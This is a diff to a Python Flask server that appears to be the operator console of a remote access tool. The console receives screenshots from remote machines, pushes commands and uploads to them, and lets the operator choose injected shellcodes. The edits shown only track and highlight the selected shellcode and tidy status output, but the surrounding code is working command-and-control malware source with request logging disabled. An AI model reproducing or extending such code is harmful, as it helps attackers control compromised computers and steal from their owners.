@@ -74,7 +74,7 @@ progress = {
 log = logging.getLogger('werkzeug')
 log.disabled = True
 
-clientIP = ""
+clientIP, chosen_shellcode = "", None
 emptyresponse = ('', 204)
 pastcmds, upload_contents, cmd_contents = deque(maxlen=10), "", ""
 
@@ -248,7 +248,7 @@ def valid_file(file):
 
 @app.route('/')
 def handleGET():
-    global upload_contents, cmd_contents, waiting, pastcmds
+    global upload_contents, cmd_contents, waiting, pastcmds, chosen_shellcode
     try:
         if waiting == True:
             waiting = False
@@ -308,7 +308,10 @@ def handleGET():
                 reload(utils)
                 if utils.shellcodes[1][0]:
                     for k,v in utils.shellcodes.items():
-                        print(f"{B+str(k)+RA} => {v[0]}")
+                        if chosen_shellcode == k:
+                            print(f"{B+str(k)+RA} => {G+v[0]+RA}")
+                        else:
+                            print(f"{B+str(k)+RA} => {v[0]}")
                 else:
                     print(f"[{B}ERROR{RA}] There are no shellcodes available.")
                 return emptyresponse
@@ -317,6 +320,7 @@ def handleGET():
                 reload(utils)
                 try:
                     if utils.shellcodes[shc_id][0]:
+                        chosen_shellcode = shc_id
                         return redirect(url_for('setshellcode',
                             shc_id=shc_id)
                         )
@@ -331,7 +335,7 @@ def handleGET():
                 return emptyresponse
             elif exit_cmd.match(cmd):
                 cmd_contents = cmd
-                waiting = True
+                waiting, chosen_shellcode = True, None
                 startloading()
                 return redirect(url_for('commander'))
             else:
@@ -360,7 +364,7 @@ def handlePOST():
             img.save(screenshot_name)
             print(f'[{B+G}SUCCESS{RA}] {screenshot_name} successfully downloaded!')
         elif request.headers.get('Shellcode_id'):
-            slowprint(f"[+] Shellcode successfully set to: {Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0]}{RA}")
+            slowprint(f"{B}[+]{RA} Shellcode successfully set to: {Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0]}{RA}")
         else:
             print(request.data[:-1].decode())
     return emptyresponse
